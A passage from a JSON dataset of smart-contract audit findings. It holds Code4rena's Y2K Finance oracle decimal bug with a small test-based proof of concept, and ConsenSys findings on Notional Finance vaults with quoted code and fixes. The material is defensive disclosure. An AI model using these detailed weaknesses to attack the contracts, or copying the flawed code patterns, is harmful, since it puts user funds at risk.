      "content": "\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/oracles/PegOracle.sol#L46-L83>\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L299-L300>\n\n### Impact\n\nWrong math for handling pricefeed decimals. This code will only work for pricefeeds of 8 decimals, any others give wrong/incorrect data. The maths used can be shown in three lines:\n\n```solidity\nnowPrice = (price1 * 10000) / price2;\nnowPrice = nowPrice * int256(10**(18 - priceFeed1.decimals()));\nreturn nowPrice / 1000000;\n```\n\nLine1: adds 4 decimals\nLine2: adds (18 - d) decimals, (where d = pricefeed.decimals())\nLine3:  removes 6 decimals\n\nTotal: adds (16 - d) decimals\n\nwhen d=8, the contract correctly returns an 8 decimal number. However, when d = 6, the function will return a 10 decimal number. This is further raised by (18-d = 12) decimals when checking for depeg event, leading to a 22 decimal number which is 4 orders of magnitude incorrect.\n\nif d=18, (like usd-eth pricefeeds) contract fails / returns 0.\n\nAll chainlink contracts which give price in eth, operate with 18 decimals. So this can cripple the system if added later.\n\n### Proof of Concept\n\nRunning the test  AssertTest.t.sol:testPegOracleMarketCreation and changing the line on\n\n<https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/test/AssertTest.t.sol#L30>\n\nto\n\n```solidity\nPegOracle pegOracle3 = new PegOracle(\n            0xB1552C5e96B312d0Bf8b554186F846C40614a540,  //usd-eth contract address\n            btcEthOracle\n        );\n```\n\ngives this output\n\n    oracle3price1: 1085903802394919427                                                                                                                                                                               \n    oracle3price2: 13753840915281064000                                                                                                                                                                              \n    oracle3price1 / oracle3price2: 0\n\nreturning an oracle value of 0. Simulating with a mock price feed of 6 decimals gives results 4 orders of magnitude off.\n\n### Tools Used\n\nFoundry, VS-Code\n\n### Recommended Mitigation Steps\n\nSince only the price ratio is calculated, there is no point in increasing the decimal by (18-d) in the second line. Proposed solution:\n\n```solidity\nnowPrice = (price1 * 10000) / price2;\nnowPrice = nowPrice * int256(10**(priceFeed1.decimals())) * 100;\nreturn nowPrice / 1000000;\n```\n\nThis returns results in d decimals, no matter the value of d.\n\n**[MiguelBits (Y2K Finance) confirmed](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/195)** \n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the PegOracle.sol file of the 2022-09-y2k-finance Github repository. The vulnerability is caused by incorrect maths for handling pricefeed decimals. The code only works for pricefeeds of 8 decimals, any others give wrong/incorrect data. This can lead to a contract failure or incorrect data when the pricefeed is set to 6 or 18 decimals. To test the vulnerability, the AssertTest.t.sol:testPegOracleMarketCreation was run and the results showed an oracle value of 0. Simulating with a mock price feed of 6 decimals gave results 4 orders of magnitude off. The recommended mitigation step is to change the second line of the code to return results in d decimals, no matter the value of d.",
      "quality_score": 5,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/195",
      "tags": [
        "Oracle",
        "Wrong Math",
        "Decimals"
      ],
      "finders": [
        "carrotsmuggler",
        "0xPanas",
        "0x52",
        "Bahurum",
        "PwnPatrol",
        "pauliax",
        "auditor0517",
        "scaraven",
        "Jeiwan",
        "0xDecorativePineapple",
        "ladboy233",
        "Respx",
        "Lambda",
        "zzzitron",
        "teawaterwire",
        "hyh",
        "durianSausage",
        "R2"
      ]
    },
    {
      "id": "13253",
      "title": "Cross currency strategy should not have same lend and borrow currencies",
      "impact": "LOW",
      "content": "#### Description\n\n\nCross currency strategy currently takes lend and borrow currencies as the initialization arguments. Due to the way strategy and `TradingModule` are implemented, the strategy will not operate correctly if lend and borrow currencies are the same. Despite those arguments being passed exclusively by the Notional team, there is still a possibility of incorrect arguments being used.\n\n\n#### Examples\n\n\n**strategy-vaults/contracts/vaults/CrossCurrencyfCashVault.sol:L77-L82**\n\n\n\n```\nfunction initialize(\n    string memory name\\_,\n    uint16 borrowCurrencyId\\_,\n    uint16 lendCurrencyId\\_,\n    uint64 settlementSlippageLimit\\_\n) external initializer {\n\n```\n#### Recommendation\n\n\nWe suggest adding a `require` check in the initialization function of the `CrossCurrencyfCashVault.sol` that will ensure that lend and borrow currencies are different.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Notional Finance",
      "source_link": "https://consensys.net/diligence/audits/2022/07/notional-finance/",
      "github_link": "",
      "tags": [],
      "finders": [
        "George Kobakhidze",
        " Chingiz Mardanov",
        " Sergii Kravchenko\n"
      ]
    },
    {
      "id": "13252",
      "title": "Strategy vault swaps can be frontrun",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nAcknowledged with a note from the Notional’s team:\n“This is a large part of the diligence process for writing strategies”\n\n\n#### Description\n\n\nSome strategy vaults utilize borrowing one currency, swapping it for another, and then using the new currency somewhere to generate yield. For example, the CrossCurrencyfCash strategy vault could borrow USDC, swap it for DAI, and then deposit that DAI back into Notional if the DAI lending interest rates are greater than USDC borrowing interest rates. However, during vault settlement the assets would need to be swapped back into the original borrow currency.\n\n\nSince these vaults control the borrowed assets that go only into white-listed strategies, the Notional system allows users to borrow multiples of their posted collateral and claim the yield from a much larger position. As a result, these strategy vaults would likely have significant funds being borrowed and managed into these strategies.\n\n\nHowever, as mentioned above, these strategies usually utilize a trading mechanism to swap borrowed currencies into whatever is required by the strategy, and these trades may be quite large. In fact, the `BaseStrategyVault` implementation contains functions that interact with Notional’s trading module to assist with those swaps:\n\n\n**strategy-vaults/contracts/vaults/BaseStrategyVault.sol:L100-L127**\n\n\n\n```\n/// @notice Can be used to delegate call to the TradingModule's implementation in order to execute\n/// a trade.\nfunction \\_executeTrade(\n    uint16 dexId,\n    Trade memory trade\n) internal returns (uint256 amountSold, uint256 amountBought) {\n    (bool success, bytes memory result) = nProxy(payable(address(TRADING\\_MODULE))).getImplementation()\n        .delegatecall(abi.encodeWithSelector(ITradingModule.executeTrade.selector, dexId, trade));\n    require(success);\n    (amountSold, amountBought) = abi.decode(result, (uint256, uint256));\n}\n\n/// @notice Can be used to delegate call to the TradingModule's implementation in order to execute\n/// a trade.\nfunction \\_executeTradeWithDynamicSlippage(\n    uint16 dexId,\n    Trade memory trade,\n    uint32 dynamicSlippageLimit\n) internal returns (uint256 amountSold, uint256 amountBought) {\n    (bool success, bytes memory result) = nProxy(payable(address(TRADING\\_MODULE))).getImplementation()\n        .delegatecall(abi.encodeWithSelector(\n            ITradingModule.executeTradeWithDynamicSlippage.selector,\n            dexId, trade, dynamicSlippageLimit\n        )\n    );\n    require(success);\n    (amountSold, amountBought) = abi.decode(result, (uint256, uint256));\n}\n\n```\nAlthough some strategies may manage stablecoin <-> stablecoin swaps that typically would incur low slippage, large size trades could still suffer from low on-chain liquidity and end up getting frontrun and “sandwiched” by MEV bots or other actors, thereby extracting maximum amount from the strategy vault swaps as slippage permits. This could be especially significant during vaults' settlements, that can be initiated by anyone, as lending currencies may be swapped in large batches and not do it on a per-account basis. For example with the CrossCurrencyfCash vault, it can only enter settlement if all strategy tokens (lending currency in this case) are gone and swapped back into the borrow currency:\n\n\n**strategy-vaults/contracts/vaults/CrossCurrencyfCashVault.sol:L141-L143**\n\n\n\n```\nif (vaultState.totalStrategyTokens == 0) {\n    NOTIONAL.settleVault(address(this), maturity);\n}\n\n```\nAs a result, in addition to the risk of stablecoins' getting off-peg, unfavorable market liquidity conditions and arbitrage-seeking actors could eat into the profits generated by this strategy as per the maximum allowed slippage. However, during settlement the strategy vaults don’t have the luxury of waiting for the right conditions to perform the trade as the borrows need to repaid at their maturities.\n\n\nSo, the profitability of the vaults, and therefore users, could suffer due to potential low market liquidity allowing high slippage and risks of being frontrun with the chosen strategy vaults' currencies.\n\n\n#### Recommendation\n\n\nEnsure that the currencies chosen to generate yield in the strategy vaults have sufficient market liquidity on exchanges allowing for low slippage swaps.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Notional Finance",
      "source_link": "https://consensys.net/diligence/audits/2022/07/notional-finance/",
      "github_link": "",
      "tags": [],
      "finders": [
        "George Kobakhidze",
        " Chingiz Mardanov",
        " Sergii Kravchenko\n"
      ]
    },
    {
      "id": "13251",
      "title": "Significantly undercollateralized accounts will revert on liquidation",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nRemediated per Notional’s team notes in [commit](https://github.com/notional-finance/contracts-v2/pull/104/commits/2a749da0d2e4f3f6d9ea4c685dc264640729a792) by updating the calculations within `calculateDeleverageAmount`\n\n\n#### Description\n\n\nThe Notional Strategy Vaults utilise collateral to allow leveraged borrowing as long as the account passes the `checkCollateralRatio` check that ensures the overall account value is at least `minCollateralRatio` greater than its debts.\nIf the account doesn’t have sufficient collateral, it goes through a liquidation process where some of the collateral is sold to liquidators for the account’s borrowed currency in attempt to improve the collateral ratio.\nHowever, if the account is severely undercollateralised, the entire account position is liquidated and given over to the liquidator:\n\n\n**contracts-v2/contracts/internal/vaults/VaultAccount.sol:L282-L289**\n\n\n\n```\nint256 depositRatio = maxLiquidatorDepositAssetCash.mul(vaultConfig.liquidationRate).div(vaultShareValue);\n\n// Use equal to so we catch potential off by one issues, the deposit amount calculated inside the if statement\n// below will round the maxLiquidatorDepositAssetCash down\nif (depositRatio >= Constants.RATE\\_PRECISION) {\n    maxLiquidatorDepositAssetCash = vaultShareValue.divInRatePrecision(vaultConfig.liquidationRate);\n    // Set this to true to ensure that the account gets fully liquidated\n    mustLiquidateFullAmount = true;\n\n```\nHere, the liquidator will need to deposit exactly `maxLiquidatorDepositAssetCash=vaultShareValue/liquidationRate` in order to get all of account’s assets, i.e. all of `vaultShareValue` in the form of `vaultAccount.vaultShares`. In fact, later this deposit will be set in `vaultAccount.tempCashBalance`:\n\n\n**contracts-v2/contracts/external/actions/VaultAccountAction.sol:L361-L380**\n\n\n\n```\nint256 maxLiquidatorDepositExternal = assetToken.convertToExternal(maxLiquidatorDepositAssetCash);\n\n// NOTE: deposit amount external is always positive in this method\nif (depositAmountExternal < maxLiquidatorDepositExternal) {\n    // If this flag is set, the liquidator must deposit more cash in order to liquidate the account\n    // down to a zero fCash balance because it will fall under the minimum borrowing limit.\n    require(!mustLiquidateFull, \"Must Liquidate All Debt\");\n} else {\n    // In the other case, limit the deposited amount to the maximum\n    depositAmountExternal = maxLiquidatorDepositExternal;\n}\n\n// Transfers the amount of asset tokens into Notional and credit it to the account's temp cash balance\nint256 assetAmountExternalTransferred = assetToken.transfer(\n    liquidator, vaultConfig.borrowCurrencyId, depositAmountExternal\n);\n\nvaultAccount.tempCashBalance = vaultAccount.tempCashBalance.add(\n    assetToken.convertToInternal(assetAmountExternalTransferred)\n);\n\n```\nThen the liquidator will get:\n\n\n**contracts-v2/contracts/external/actions/VaultAccountAction.sol:L274-L281**\n\n\n\n```\nuint256 vaultSharesToLiquidator;\n{\n    vaultSharesToLiquidator = vaultAccount.tempCashBalance.toUint()\n        .mul(vaultConfig.liquidationRate.toUint())\n        .mul(vaultAccount.vaultShares)\n        .div(vaultShareValue.toUint())\n        .div(uint256(Constants.RATE\\_PRECISION));\n}\n\n```\nAnd if (except for precision and conversions) `vaultAccount.tempCashBalance=maxLiquidatorDepositAssetCash=vaultShareValue/liquidationRate`, then `vaultSharesToLiquidator = (vaultAccount.tempCashBalance * liquidationRate * vaultAccount.vaultShares) / (vaultShareValue)`\nbecomes\n`vaultSharesToLiquidator = ((vaultShareValue/liquidationRate)* liquidationRate * vaultAccount.vaultShares) / (vaultShareValue) = vaultAccount.vaultShares`\n\n\nIn other words, the liquidator needed to deposit exactly `vaultShareValue/liquidationRate` to get all `vaultAccount.vaultShares`. However, the liquidator deposit (what would be in `vaultAccount.tempCashBalance`) needs to cover all of that account’s debt, i.e. `vaultAccount.fCash`. At the end of the liquidation process, the vault account has its fCash and tempCash balances updated:\n\n\n**contracts-v2/contracts/external/actions/VaultAccountAction.sol:L289-L290**\n\n\n\n```\nint256 fCashToReduce = vaultConfig.assetRate.convertToUnderlying(vaultAccount.tempCashBalance);\nvaultAccount.updateAccountfCash(vaultConfig, vaultState, fCashToReduce, vaultAccount.tempCashBalance.neg());\n\n```\n**contracts-v2/contracts/internal/vaults/VaultAccount.sol:L77-L88**\n\n\n\n```\nfunction updateAccountfCash(\n    VaultAccount memory vaultAccount,\n    VaultConfig memory vaultConfig,\n    VaultState memory vaultState,\n    int256 netfCash,\n    int256 netAssetCash\n) internal {\n    vaultAccount.tempCashBalance = vaultAccount.tempCashBalance.add(netAssetCash);\n\n    // Update fCash state on the account and the vault\n    vaultAccount.fCash = vaultAccount.fCash.add(netfCash);\n    require(vaultAccount.fCash <= 0);\n\n```\nWhile the `vaultAccount.tempCashBalance` gets cleared to 0, the `vaultAccount.fCash` amount only gets to `vaultAccount.fCash = vaultAccount.fCash.add(netfCash)`, and `netfCash=fCashToReduce = vaultConfig.assetRate.convertToUnderlying(vaultAccount.tempCashBalance)`, which, based on the constraints above essentially becomes:\n\n\n`vaultAccount.fCash=vaultAccount.fCash+vaultConfig.assetRate.convertToUnderlying(assetToken.convertToExternal(vaultShareValue/vaultConfig.liquidationRate))`\n\n\nHowever, later this account is set on storage, and, considering it is going through 100% liquidation, the account will necessarily be below minimum borrow size and will need to be at `vaultAccount.fCash==0`.\n\n\n**contracts-v2/contracts/internal/vaults/VaultAccount.sol:L52-L62**\n\n\n\n```\nfunction setVaultAccount(VaultAccount memory vaultAccount, VaultConfig memory vaultConfig) internal {\n    mapping(address => mapping(address => VaultAccountStorage)) storage store = LibStorage\n        .getVaultAccount();\n    VaultAccountStorage storage s = store[vaultAccount.account][vaultConfig.vault];\n\n    // The temporary cash balance must be cleared to zero by the end of the transaction\n    require(vaultAccount.tempCashBalance == 0); // dev: cash balance not cleared\n    // An account must maintain a minimum borrow size in order to enter the vault. If the account\n    // wants to exit under the minimum borrow size it must fully exit so that we do not have dust\n    // accounts that become insolvent.\n    require(vaultAccount.fCash == 0 || vaultConfig.minAccountBorrowSize <= vaultAccount.fCash.neg(), \"Min Borrow\");\n\n```\nThe case where vaultAccount.fCash>0 is taken care of by taking any extra repaid value and assigning it to the protocol, zeroing out the account’s balances:\n\n\n**contracts-v2/contracts/external/actions/VaultAccountAction.sol:L293**\n\n\n\n```\nif (vaultAccount.fCash > 0) vaultAccount.fCash = 0;\n\n```\nThe case where `vaultAccount.fCash < 0` is however not addressed, and instead the process will revert. This will occur whenever the vaultShareValue discounted with the liquidation rate is less than the fCash debt after all the conversions between external and underlying accounting. So, whenever the below is true, the account will not be liquidate-able.\n`fCash>vaultShareValue/liquidationRate`\n\n\nThis is an issue because the account is still technically solvent even though it is undercollateralized, but the current implementation would simply revert until the account is entirely insolvent (still without liquidation options) or its balances are restored enough to be liquidated fully.\n\n\nConsider implementing a dynamic liquidation rate that becomes smaller the closer the account is to insolvency, thereby encouraging liquidators to promptly liquidate the accounts.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Notional Finance",
      "source_link": "https://consensys.net/diligence/audits/2022/07/notional-finance/",
      "github_link": "",
      "tags": [],
      "finders": [
        "George Kobakhidze",
        " Chingiz Mardanov",
        " Sergii Kravchenko\n"
      ]
    },
    {
      "id": "13250",
      "title": "Rollover might introduce economically impractical deposits of dust into a strategy",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nAcknowledged with a note from the Notional’s team:\n\n\n“This is true, however, vaults with secondary borrows may need to execute logic in order to roll positions forward. We will opt to not do any handling for dust amounts on the vault controller side and allow each vault to set its own dust thresholds.”\n\n\n\n\n#### Description\n\n\nDuring the rollover of the strategy position into a longer maturity, several things happen:\n\n\n* Funds are borrowed from the longer maturity to pay off the debt and fees of the current maturity.\n* Strategy tokens that are associated with the current maturity are moved to the new maturity.\n* Any additional funds provided by the account are deposited into the strategy into a new longer maturity.\n\n\nIn reality, due to the AMM nature of the protocol, the funds borrowed from the new maturity could exceed the debt the account has in the current maturity, resulting in a non-zero `vaultAccount.tempCashBalance`. In that case, those funds will be deposited into the strategy. That would happen even if there are no external funds supplied by the account for the deposit.\n\n\nIt is possible that the dust in the temporary account balance will not cover the gas cost of triggering a full deposit call of the strategy.\n\n\n#### Examples\n\n\n**contracts-v2/contracts/internal/vaults/VaultState.sol:L244-L246**\n\n\n\n```\nuint256 strategyTokensMinted = vaultConfig.deposit(\n    vaultAccount.account, vaultAccount.tempCashBalance, vaultState.maturity, additionalUnderlyingExternal, vaultData\n);\n\n```\n#### Recommendation\n\n\nWe suggest that additional checks are introduced that would check that on rollover `vaultAccount.tempCashBalance + additionalUnderlyingExternal > 0` or larger than a certain threshold like `minAccountBorrowSize` for example.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Notional Finance",
      "source_link": "https://consensys.net/diligence/audits/2022/07/notional-finance/",
      "github_link": "",
      "tags": [],
      "finders": [
        "George Kobakhidze",
        " Chingiz Mardanov",
        " Sergii Kravchenko\n"
      ]
    },
    {
      "id": "13249",
      "title": "An account roll may be impossible if the vault is already at the maximum borrow capacity.",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nRemediated per Notional’s team notes in [commit](https://github.com/notional-finance/contracts-v2/pull/104/commits/efc9de05540bb976e6c8b8080c5a2e5b9f50b35d) by adding the ability for accounts to deposit during a roll vault position call to offset any additional cost that would put them over the maximum borrow capacity.\n\n\n#### Description\n\n\nOne of the actions allowed in Notional Strategy Vaults is to roll an account’s maturity to a later one by borrowing from a later maturity and repaying that into the debt of the earlier maturity.\n\n\nHowever, this could cause an issue if the vault is at maximum capacity at the time of the roll. When an account performs this type of roll, the new borrow would have to be more than the existing debt simply because it has to at least cover the existing debt and pay for the borrow fees that get added on every new borrow. Since the whole vault was already at max borrow capacity before with the old, smaller borrow, this process would revert at the end after the new borrow as well once the process gets to `VaultAccount.updateAccountfCash` and `VaultConfiguration.updateUsedBorrowCapacity`:\n\n\n**contracts-v2/contracts/internal/vaults/VaultConfiguration.sol:L243-L257**\n\n\n\n```\nfunction updateUsedBorrowCapacity(\n    address vault,\n    uint16 currencyId,\n    int256 netfCash\n) internal returns (int256 totalUsedBorrowCapacity) {\n    VaultBorrowCapacityStorage storage cap = LibStorage.getVaultBorrowCapacity()[vault][currencyId];\n\n    // Update the total used borrow capacity, when borrowing this number will increase (netfCash < 0),\n    // when lending this number will decrease (netfCash > 0).\n    totalUsedBorrowCapacity = int256(uint256(cap.totalUsedBorrowCapacity)).sub(netfCash);\n    if (netfCash < 0) {\n        // Always allow lending to reduce the total used borrow capacity to satisfy the case when the max borrow\n        // capacity has been reduced by governance below the totalUsedBorrowCapacity. When borrowing, it cannot\n        // go past the limit.\n        require(totalUsedBorrowCapacity <= int256(uint256(cap.maxBorrowCapacity)), \"Max Capacity\");\n\n```\nThe result is that users won’t able to roll while the vault is at max capacity. However, users may exit some part of their position to reduce their borrow, thereby reducing the overall vault borrow capacity, and then could execute the roll. A bigger problem would occur if the vault configuration got updated to massively reduce the borrow capacity, which would force users to exit their position more significantly with likely a much smaller chance at being able to roll.\n\n\n#### Recommendation\n\n\nDocument this case so that users can realise that rolling may not always be an option. Perhaps consider adding ways where users can pay a small deposit, like on `enterVault`, to offset the additional difference in borrows and pay for fees so they can remain with essentially the same size position within Notional.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Notional Finance",
      "source_link": "https://consensys.net/diligence/audits/2022/07/notional-finance/",
      "github_link": "",
      "tags": [],
      "finders": [
        "George Kobakhidze",
        " Chingiz Mardanov",
        " Sergii Kravchenko\n"
      ]
    },
    {
      "id": "13248",
      "title": "Vaults are unable to borrow single secondary currency",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nRemediated per Notional’s team notes.\n\n\n#### Description\n\n\nAs was previously mentioned some strategies require borrowing one or two secondary currencies. All secondary currencies have to be whitelisted in the `VaultConfig.secondaryBorrowCurrencies`. Borrow operation on secondary currencies is performed in the `borrowSecondaryCurrencyToVault(...)` function. Due to a `require` statement in that function, vaults will only be able to borrow secondary currencies if both of the currencies are whitelisted in `VaultConfig.secondaryBorrowCurrencies`. Considering that many strategies will have just one secondary currency, this will prevent those strategies from borrowing any secondary assets.\n\n\n#### Examples\n\n\n**contracts-v2/contracts/external/actions/VaultAction.sol:L214**\n\n\n\n```\nrequire(currencies[0] != 0 && currencies[1] != 0);\n\n```\n#### Recommendation\n\n\nWe suggest that the `&&` operator is replaced by the `||` operator. Ideally, an additional check will be performed that will ensure that values in argument arrays `fCashToBorrow`, `maxBorrowRate`, and `minRollLendRate` are passed under the same index as the whitelisted currencies in `VaultConfig.secondaryBorrowCurrencies`.\n\n\n**contracts-v2/contracts/external/actions/VaultAction.sol:L202-L208**\n\n\n\n```\nfunction borrowSecondaryCurrencyToVault(\n    address account,\n    uint256 maturity,\n    uint256[2] calldata fCashToBorrow,\n    uint32[2] calldata maxBorrowRate,\n    uint32[2] calldata minRollLendRate\n) external override returns (uint256[2] memory underlyingTokensTransferred) {\n\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Notional Finance",
      "source_link": "https://consensys.net/diligence/audits/2022/07/notional-finance/",
      "github_link": "",
      "tags": [],
      "finders": [
        "George Kobakhidze",
        " Chingiz Mardanov",
        " Sergii Kravchenko\n"
      ]
    },
    {
      "id": "13247",
      "title": "Secondary Currency debt is not managed by the Notional Controller",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nRemediated per Notional’s team notes in [commit](https://github.com/notional-finance/contracts-v2/pull/104/commits/6a7b3af67918596dbbeb6bf66c0d228a350baf3d) by adding valuation for secondary borrow within the vault.\n\n\n#### Description\n\n\nSome of the Notional Strategy Vaults may allow for secondary currencies to be borrowed as part of the same strategy. For example, a strategy may allow for USDC to be its primary borrow currency as well as have ETH as its secondary borrow currency.\n\n\nIn order to enter the vault, a user would have to deposit `depositAmountExternal` of the primary borrow currency when calling `VaultAccountAction.enterVault()`. This would allow the user to borrow with leverage, as long as the `vaultConfig.checkCollateralRatio()` check on that account succeeds, which is based on the initial deposit and borrow currency amounts. This collateral ratio check is then performed throughout that user account’s lifecycle in that vault, such as when they try to roll their maturity, or when liquidators try to perform collateral checks to ensure there is no bad debt.\n\n\nHowever, in the event that the vault has a secondary borrow currency as well, that additional secondary debt is not calculated as part of the `checkCollateralRatio()` check. The only debt that is being considered is the `vaultAccount.fCash` that corresponds to the primary borrow currency debt:\n\n\n**contracts-v2/contracts/internal/vaults/VaultConfiguration.sol:L313-L319**\n\n\n\n```\nfunction checkCollateralRatio(\n    VaultConfig memory vaultConfig,\n    VaultState memory vaultState,\n    VaultAccount memory vaultAccount\n) internal view {\n    (int256 collateralRatio, /\\* \\*/) = calculateCollateralRatio(\n        vaultConfig, vaultState, vaultAccount.account, vaultAccount.vaultShares, vaultAccount.fCash\n\n```\n**contracts-v2/contracts/internal/vaults/VaultConfiguration.sol:L278-L292**\n\n\n\n```\nfunction calculateCollateralRatio(\n    VaultConfig memory vaultConfig,\n    VaultState memory vaultState,\n    address account,\n    uint256 vaultShares,\n    int256 fCash\n) internal view returns (int256 collateralRatio, int256 vaultShareValue) {\n    vaultShareValue = vaultState.getCashValueOfShare(vaultConfig, account, vaultShares);\n\n    // We do not discount fCash to present value so that we do not introduce interest\n    // rate risk in this calculation. The economic benefit of discounting will be very\n    // minor relative to the added complexity of accounting for interest rate risk.\n\n    // Convert fCash to a positive amount of asset cash\n    int256 debtOutstanding = vaultConfig.assetRate.convertFromUnderlying(fCash.neg());\n\n```\nWhereas the value of strategy tokens that belong to that user account are being calculated by calling `IStrategyVault(vault).convertStrategyToUnderlying()` on the associated strategy vault:\n\n\n**contracts-v2/contracts/internal/vaults/VaultState.sol:L314-L324**\n\n\n\n```\nfunction getCashValueOfShare(\n    VaultState memory vaultState,\n    VaultConfig memory vaultConfig,\n    address account,\n    uint256 vaultShares\n) internal view returns (int256 assetCashValue) {\n    if (vaultShares == 0) return 0;\n    (uint256 assetCash, uint256 strategyTokens) = getPoolShare(vaultState, vaultShares);\n    int256 underlyingInternalStrategyTokenValue = \\_getStrategyTokenValueUnderlyingInternal(\n        vaultConfig.borrowCurrencyId, vaultConfig.vault, account, strategyTokens, vaultState.maturity\n    );\n\n```\n**contracts-v2/contracts/internal/vaults/VaultState.sol:L296-L311**\n\n\n\n```\nfunction \\_getStrategyTokenValueUnderlyingInternal(\n    uint16 currencyId,\n    address vault,\n    address account,\n    uint256 strategyTokens,\n    uint256 maturity\n) private view returns (int256) {\n    Token memory token = TokenHandler.getUnderlyingToken(currencyId);\n    // This will be true if the the token is \"NonMintable\" meaning that it does not have\n    // an underlying token, only an asset token\n    if (token.decimals == 0) token = TokenHandler.getAssetToken(currencyId);\n\n    return token.convertToInternal(\n        IStrategyVault(vault).convertStrategyToUnderlying(account, strategyTokens, maturity)\n    );\n}\n\n```\nFrom conversations with the Notional team, it is assumed that this call returns the strategy token value subtracted against the secondary currencies debt, as is the case in the `Balancer2TokenVault` for example. In other words, when collateral ratio checks are performed, those strategy vaults that utilize secondary currency borrows would need to calculate the value of strategy tokens already accounting for any secondary debt. However, this is a dependency for a critical piece of the Notional controller’s strategy vaults collateral checks.\n\n\nTherefore, even though the strategy vaults' code and logic would be vetted before their whitelisting into the Notional system, they would still remain an external dependency with relatively arbitrary code responsible for the liquidation infrastructure that could lead to bad debt or incorrect liquidations if the vaults give inaccurate information, and thus potential loss of funds.\n\n\n#### Recommendation\n\n\nSpecific strategy vault implementations using secondary borrows were not in scope of this audit. However, since the core Notional Vault system was, and it includes secondary borrow currency functionality, from the point of view of the larger Notional system it is recommended to include secondary debt checks within the Notional controller contract to reduce external dependency on the strategy vaults' logic.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Notional Finance",
      "source_link": "https://consensys.net/diligence/audits/2022/07/notional-finance/",
      "github_link": "",
      "tags": [],
      "finders": [
        "George Kobakhidze",
        " Chingiz Mardanov",
        " Sergii Kravchenko\n"
      ]
    },
    {
      "id": "13246",
      "title": "Increasing a leveraged position in a vault with secondary borrow currency will revert",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nPer Notional team’s notes, they have rearranged if statement to ensure that increasing an existing position will work. The proposed solution was skipped as it creates issues with the `_repayDuringRoll` method which will attempt to lend on the current maturity. [Commit](https://github.com/notional-finance/contracts-v2/pull/104/commits/27ec29e8bb882add06b39032747a6f508ba1c535)\n\n\n#### Description\n\n\nFrom the client’s specifications for the strategy vaults, we know that accounts should be able to increase their leveraged positions before maturity. This property will not hold for the vaults that require borrowing a secondary currency to enter a position. When an account opens its position in such vault for the first time, the `VaultAccountSecondaryDebtShareStorage.maturity` is set to the maturity an account has entered. When the account is trying to increase the debt position, an accounts current maturity will be checked, and since it is not set to 0, as in the case where an account enters the vault for the first time, nor it is smaller than the new maturity passed by an account as in case of a rollover, the code will revert.\n\n\n#### Examples\n\n\n**contracts-v2/contracts/external/actions/VaultAction.sol:L226-L228**\n\n\n\n```\nif (accountMaturity != 0) {\n    // Cannot roll to a shorter term maturity\n    require(accountMaturity < maturity);\n\n```\n#### Recommendation\n\n\nIn order to fix this issue, we recommend that `<` is replaced with `<=` so that account can enter the vault maturity the account is already in as well as the future once.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Notional Finance",
      "source_link": "https://consensys.net/diligence/audits/2022/07/notional-finance/",
      "github_link": "",
      "tags": [],
      "finders": [
        "George Kobakhidze",
        " Chingiz Mardanov",
        " Sergii Kravchenko\n"
      ]
    },
    {
      "id": "13245",
      "title": "Handle division by 0",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nRemediated per Notional’s team notes in [commit](https://github.com/notional-finance/contracts-v2/pull/104/commits/1681e16cd798fb60e756051d051de075ab641d21) by adding the following checks:\n\n\n* Check to account for div by zero in settle vault account\n* Short circuit to ensure debtSharesToRepay is never zero. Divide by zero may still occur but this would signal a critical accounting issue\n\n\nThe Notional team also acknowledged that the contract will revert when `vaultShareValue = 0`. The team decided to not make any changes related to that since liquidation will not accomplish anything for an account with no vault share value.\n\n\n\n\n#### Description\n\n\nThere are a few places in the code where division by zero may occur but isn’t handled.\n\n\n#### Examples\n\n\nIf the vault settles at exactly 0 value with 0 remaining strategy token value, there may be an unhandled division by zero trying to divide claims on the settled assets:\n\n\n**contracts-v2/contracts/internal/vaults/VaultAccount.sol:L424-L436**\n\n\n\n```\nint256 settledVaultValue = settlementRate.convertToUnderlying(residualAssetCashBalance)\n    .add(totalStrategyTokenValueAtSettlement);\n\n// If the vault is insolvent (meaning residualAssetCashBalance < 0), it is necessarily\n// true that totalStrategyTokens == 0 (meaning all tokens were sold in an attempt to\n// repay the debt). That means settledVaultValue == residualAssetCashBalance, strategyTokenClaim == 0\n// and assetCashClaim == totalAccountValue. Accounts that are still solvent will be paid from the\n// reserve, accounts that are insolvent will have a totalAccountValue == 0.\nstrategyTokenClaim = totalAccountValue.mul(vaultState.totalStrategyTokens.toInt())\n    .div(settledVaultValue).toUint();\n\nassetCashClaim = totalAccountValue.mul(residualAssetCashBalance)\n    .div(settledVaultValue);\n\n```\nIf a vault account is entirely insolvent and its `vaultShareValue` is 